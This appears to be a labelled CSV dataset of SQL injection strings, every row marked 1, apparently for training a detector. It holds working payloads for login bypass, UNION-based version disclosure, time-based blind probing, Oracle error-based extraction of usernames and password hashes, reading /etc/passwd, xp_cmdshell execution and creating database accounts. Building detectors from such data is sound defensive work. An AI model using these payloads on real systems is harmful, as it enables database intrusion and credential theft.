,Sentence,Label
51, select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
52," select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1
53," select * from users where id = 1 union select 1||1,version (  )  -- 1",1
54," select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
55,1s,1
56, select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1
57," select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",1
58," select * from users where id = 1 or "".@"" or 1 = 1 -- 1",1
59," select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
60, or 1 --',1
61," select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1
62,"admin"" or 1 = 1#",1
63,'-',1
64," select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1
65,\x27UNION SELECT,1
66,PRINT,1
67," select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1
68,or 1 = 1-- ,1
69,1 or pg_sleep ( __TIME__ ) --,1
70," select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1
71,admin' )  or  ( '1' = '1'/*,1
72, or 2 between 1 and 3,1
73," select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1
74," select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1
75,admin' or '1' = '1,1
76,'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1
77," select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
78,""" or 0 = 0 --",1
79," select * from users where id = 1 union select @ $_,version (  )  -- 1",1
80, select * from users where id = 1 <@.$ or 1 = 1 -- 1,1
81," select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
82," select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1
83," select * from users where id = 1 or "",."" or 1 = 1 -- 1",1
84,char%4039%41%2b%40SELECT,1
85," select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1
86,admin' )  or  ( '1' = '1,1
87,declare @s varchar  ( 200 )  select @s  =  0x73656c6 ...,1
88,"or 0 = 0 #""",1
89," select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1
90," or benchmark ( 10000000,MD5 ( 1  )  )  #",1
91,' )  or  ( 'x' = 'x,1
92," select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
93, $ ( sleep 50 ) ,1
94," select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1
95,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1
96," select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
97," select * from users where id = 1 or 1#""; union select null,version (  )  -- 1",1
98," select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1
99,"""a"""" or 1 = 1--""",1
100," select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1
101,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
102,admin' or ',1
103," select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1
104,1'1,1
105,1 and user_name (  )   =  'dbo',1
106,"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1
107," select * from users where id = 1 or 1#""$ union select 1,version (  )  -- 1",1
108," select * from users where id = 1 or 1#""{ union select null,version (  )  -- 1",1
109, select * from users where id = '1' *$ . or 1 = 1 -- 1',1
110, select * from users where id = 1 +$+. or 1 = 1 -- 1,1
111, select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
112,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
113, or 1 = 1 or '' = ',1
114, select * from users where id = 1   or 1 = 1 -- 1,1
115, or 'text' > 't',1
116,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
117," select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1
118,"admin"" --",1
119," select * from users where id = 1 or 1#""; = 1 union select 1,version (  )  -- 1",1
120,admin' or '1' = '1'#,1
121, select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
122,s,1
123,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
124,' select * from information_schema.tables--,1
125," select * from users where id = 1 or ""$&"" or 1 = 1 -- 1",1
126,1  )  )   or pg_sleep ( __TIME__ ) --,1
127," select * from users where id = '1' union select !<@,version (  )  -- 1'",1
128,declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1
129,' or 1 = 1 or '' = ',1
130, select * from users where id = 1 %!<1 or 1 = 1 -- 1,1
131,declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) ,1
132,&,1
133,1\'1,1
134," select * from users where id = 1 or ""]1"" or 1 = 1 -- 1",1
135,%2A%28%7C%28objectclass%3D%2A%29%29,1
136," select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
137, or 'unusual'  =  'unusual',1
138,' or 1 in  ( select @@version ) --,1
139,truncate,1
140,as,1
141, or 3 = 3 --,1
142," select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1
143," select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1
144,"admin"" )  or  ( ""1"" = ""1",1
145," select * from users where id = 1 or 1#""@ union select 'a',version (  )  -- 1",1
146,"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
147," select * from users where id = 1 union select .1_,version (  )  -- 1",1
148,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,1
149," or 0 = 0 #""",1
150, select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1
151, select * from users where id = 1 %!<@ or 1 = 1 -- 1,1
152,"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1
153,1 )  or sleep ( __TIME__ ) #,1
154," select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1
155," select * from users where id = 1 <1## union select 1,version (  )  -- 1",1
156," select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1
157,29 %,1
158, select * from users where id = 1. <@ or 1 = 1 -- 1,1
159,' or true--,1
160,'; execute immediate 'sel' || 'ect us' || 'er',1
161,'hi' or 'x' = 'x';,1
162, select * from users where id = 1 <@ or 1 = 1 -- 1,1
163," select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1
164,admin' #,1
165," select * from users where id = 1 <@$_ union select 1,version (  )  -- 1",1
166," select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1
167," select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
168," union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
169,""" ) ;waitfor delay '0:0:__TIME__'--",1
170,' or 'unusual'  =  'unusual',1
171,"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  ",1
172,"admin"" or ""1"" = ""1""/*",1
173," select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1
174," select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1
175,like,1
176,; execute immediate 'sel' || 'ect us' || 'er',1
177, or username like char ( 37 ) ;,1
178,  )  )   or pg_sleep ( __TIME__ ) --,1
179, select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1
180, or 3 = 3,1
181," select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1
182,%7C,1
183, select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1
184,0x77616974666F722064656C61792027303A303A313027 ...,1
185,exec sp,1
186," select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1
187, select * from users where id = 1 or \<$ or 1 = 1 -- 1,1
188,{s,1
189,3.10E+17,1
190," select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
191,admin' or 1 = 1/*,1
192,a' waitfor delay '0:0:10'--,1
193," select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1",1
194,&1c,1
195,""" """,1
196, or 'x' = 'x,1
197," select * from users where id = 1 union select .1$_,version (  )  -- 1",1
198, and 1 in  ( select var from temp ) --,1
199,hi' )  or  ( 'a' = 'a,1
200,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
201,"admin"" or 1 = 1",1
202,""" )  or true--",1
203," select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'",1
204,1,1
205," select * from users where id = 1 or "" ( {"" or 1 = 1 -- 1",1
206,tz_offset,1
207,1 )  or pg_sleep ( __TIME__ ) --,1
208," select * from users where id = 1 or ""{."" or 1 = 1 -- 1",1
209,""" )  or sleep ( __TIME__ )  = """,1
210, select * from users where id = 1.<@. or 1 = 1 -- 1,1
211,"admin"" )  or  ( ""1"" = ""1""--",1
212,//,1
213," select * from users where id = 1<@.. union select 1,version (  )  -- 1",1
214,' or 'whatever' in  ( 'whatever' ) ,1
215, or 1 = 1--,1
216,; exec xp_regread,1
217," select * from users where id = '1' + @ 1 union select 1,version (  )  -- 1'",1
218, select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1
219," select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1
220," select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1
221,1 and 1 = 1,1
222,;s,1
223, or 0 = 0 #,1
224, union select * from users where login  =  char ...,1
225," select * from users where id = 1 union select 1||@,version (  )  -- 1",1
226,admin' )  or '1' = '1'--,1
227,1;SELECT *,1
228," select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1
229,x' and 1 =  ( select count ( * )  from tabname ) ; --,1
230," select * from users where id = '1' or """"<@ union select 1,version (  )  -- 1'",1
231," select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1
232," select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
233,"1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
234, ( s,1
235,procedure,1
236, or '' = ',1
237,or 0 = 0 #,1
238,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
239,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
240,\'; desc users; --,1
241," select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
242, select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1
243,""" or """"^""",1
244,"""-""",1
245," select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
246," select * from users where id = 1 union select 1<@$,version (  )  -- 1",1
247," select * from users where id = 1 *\ union select null,@@VERSION -- 1",1
248," select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1
249," select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1
250,admin'/*,1
251," select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1
252,'||UTL_HTTP.REQUEST,1
253,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
254," select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
255,"""  )  )   or benchmark ( 10000000,MD5 ( 1  )  )  #",1
256," select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",1
257," select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
258, select * from users where id = '1' <@.$ or 1 = 1 -- 1',1
259,1 uni/**/on select all from where,1
260," select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1
261," select * from users where id = 1 or 1#""? union select null,version (  )  -- 1",1
262,admin' )  or '1' = '1'#,1
263,'||utl_http.request ( 'httP://192.168.1.1/' ) ||',1
264, or '7659' = '7659,1
265," select * from users where id = 1 or ""{@"" or 1 = 1 -- 1",1
266,n,1
267," select * from users where id = 1 union select +!<1,version (  )  -- 1",1
268,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
269," select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1
270,or true--,1
271," select * from users where id = 1 union select !<1,version (  )  -- 1",1
272," select * from users where id = '1' union select \#,@@VERSION -- 1'",1
273," select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1",1
274,""" or true--",1
275, select * from users where id = 1. or 1 = 1 -- 1,1
276," select * from users where id = 1 or @#"", = 1 union select 1,version (  )  -- 1",1
277," select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1
278,â or 3 = 3 --,1
279,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,1
280," select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
281," select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1
282," select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1",1
283," select * from users where id = 1 or 1#""? union select version (  ) ,version (  )  -- 1",1
284," select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1
285,' or uid like '%,1
286, select * from users where id = '1' <@&1 or 1 = 1 -- 1',1
287, ) s,1
288," select * from users where id = '1' union select !<1,version (  )  -- 1'",1
289,'; exec xp_regread,1
290,23 or 1 = 1; --,1
291," select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
292," select * from users where id = 1 or ""{ ( "" = 1 or 1 = 1 -- 1",1
293," select * from users where id = 1 or ""%_"" or 1 = 1 -- 1",1
294, select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
295," select * from users where id = '1' union select \,@@VERSION -- 1'",1
296,0 or 1 = 1,1
297, select * from users where id = 1 &@ or 1 = 1 -- 1,1
298,"admin"" )  or ""1"" = ""1",1
299, select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1
300," select * from users where id = 1 or ""??"" or 1 = 1 -- 1",1
301,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
302,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
303,&apos; OR,1
304,sqlvuln;,1
305, select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1
306,UEs,1
307, select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
308,""" or """"*""",1
309,"hi or 1 = 1 --""",1
310," select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
311,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
312," select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
313," select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1
314,||UTL_HTTP.REQUEST,1
315, select * from information_schema.tables--,1
316, select * from users where id = 1 or \<\. or 1 = 1 -- 1,1
317,'  ( select top 1,1
318,Ã½ or 1 = 1 --,1
319,a' --,1
320,' or 1 = 1 /*,1
321," select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1
322," select * from users where id = '1' union select $ .,@@VERSION -- 1'",1
323, --,1
324,"exec sp_addlogin 'name' , 'password'",1
325,?s,1
326," select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1
327,0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ,1
328,',1
329," select * from users where id = 1 or "". ) "" or 1 = 1 -- 1",1
330," select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
331, group by userid having 1 = 1--,1
332," select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1
333, select * from users where id = 1 *1 or 1 = 1 -- 1,1
334," select * from users where id = 1 or @#""; = 1 or 1 = 1 -- 1",1
335,‘ or 1 = 1 --,1
336," select * from users where id = 1 *\. union select null,@@VERSION -- 1",1
337, select * from users where id = 1 % ( @ )  or 1 = 1 -- 1,1
338, or 'a' = 'a,1
339,declare @s varchar ( 22 )  select @s  = ,1
340," select * from users where id = 1 union select 1<@,version (  )  -- 1",1
341," select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1
342," select * from users where id = 1 or 1#"". union select version (  ) ,version (  )  -- 1",1
343,@variable,1
344,; exec master..xp_cmdshell,1
345,21 %,1
346, select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
347," select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
348," select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
349," select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
350," select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'",1
351,' and 1 in  ( select var from temp ) --,1
352," select * from users where id = '1' union select 1""!"",banner from v$version where rownum = 1 -- 1'",1
353," select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1
354," select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1
355, or x = x,1
356,or a = a,1
357, or '1' = '1,1
358," select * from users where id = 11<1# union select 1,version (  )  -- 1",1
359,'  )  )   or   (  (  'x'  )  )   =   (  (  'x,1
360," select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1
361," select * from users where id = '1' <@&1 union select 1,version (  )  -- 1'",1
362,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
363,'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- ,1
364, select * from users where id = 1 <@<@ or 1 = 1 -- 1,1
365," select * from users where id = 1 union select @<@$,version (  )  -- 1",1
366," select * from users where id = '1' <@<@ union select 1,version (  )  -- 1'",1
367," select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1
368," select * from users where id = 1 or 1#""{ union select version (  ) ,version (  )  -- 1",1
369,a' or 1 = 1--,1
370, )  or  ( a = a,1
371,%21,1
372,"""  )  )   or   (  (  ""x""  )  )   =   (  (  ""x",1
373," select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1
374," select * from users where id = '1' <@$_ union select 1,version (  )  -- 1'",1
375, -- &password = ,1
376, select * from users where id = 1 <@. or 1 = 1 -- 1,1
377," select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1",1
378," select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1
379,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
380,' or '1' = '1,1
381,admin' or 1 = 1,1
382," select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
383," select * from users where id = 1 union select @||1,version (  )  -- 1",1
384," select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
385," select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1
386,"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1
387," select * from users where id = 1 or 1#""? union select 1,version (  )  -- 1",1
388,' or 1 = 1--,1
389,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
390,pg_sleep ( __TIME__ ) --,1
391,‘ or 3 = 3 --,1
392," select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1
393," select * from users where id = 1 or ""$#"" or 1 = 1 -- 1",1
394, )  union select * from information_schema.tables;,1
395," select * from users where id = 1 or "" ) ]"" or 1 = 1 -- 1",1
396," )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
397,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1
398,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
399,""" or """" """,1
400,delete,1
401,;waitfor delay '0:0:__TIME__'--,1
402, or 1 = 1 --,1
403,1' and non_existant_table  =  '1,1
404," select * from users where id = 1 or ""& ) "" or 1 = 1 -- 1",1
405," select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",1
406,declare @s varchar ( 200 )  select @s  =  0x77616974 ...,1
407,x' AND userid IS NULL; --,1
408,hi' or 'x' = 'x';,1
409," select * from users where id = 1 or "";["" or 1 = 1 -- 1",1
410," select * from users where id = '1' or \.<  = 1 union select 1,@@VERSION -- 1'",1
411," select * from users where id = 1 union select @<@,version (  )  -- 1",1
412," select * from users where id = 1 -@<@ union select 1,version (  )  -- 1",1
413,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i,1
414,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
415, select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
416," select * from users where id = 1 or "".["" or 1 = 1 -- 1",1
417," select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1
418, UNION ALL SELECT,1
419," select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",1
420, select * from users where id = 1 or \<1 or 1 = 1 -- 1,1
421," select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1
422,x' or full_name like '%bob%,1
423,x' and members.email is NULL; --,1
424,' or 2 > 1,1
425, select * from users where id = 1.*1 or 1 = 1 -- 1,1
426,""" )  or pg_sleep ( __TIME__ ) --",1
427,' ',1
428," select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1
429," select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1
430, select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
431, )  or sleep ( __TIME__ )  = ',1
432, 'sleep 50',1
433," select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1
434, ) ,1
435, select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1
436," select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1
437, or sleep ( __TIME__ )  = ',1
438," select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1
439," select * from users where id = 1 or 1#"". union select 1,version (  )  -- 1",1
440," select * from users where id = 1 union select  @ $,version (  )  -- 1",1
441," select * from users where id = 1 union select +!<@,version (  )  -- 1",1
442," select * from users where id = 1 <@<@ union select null,version (  )  -- 1",1
443, or 2 > 1,1
444,; exec  ( 'sel' + 'ect us' + 'er' ) ,1
445,%28,1
446,anything' OR 'x' = 'x,1
447," select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
448," select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
449," select * from users where id = 1 * ( \ )  union select null,@@VERSION -- 1",1
450,'&',1
451,a' or 3 = 3--,1
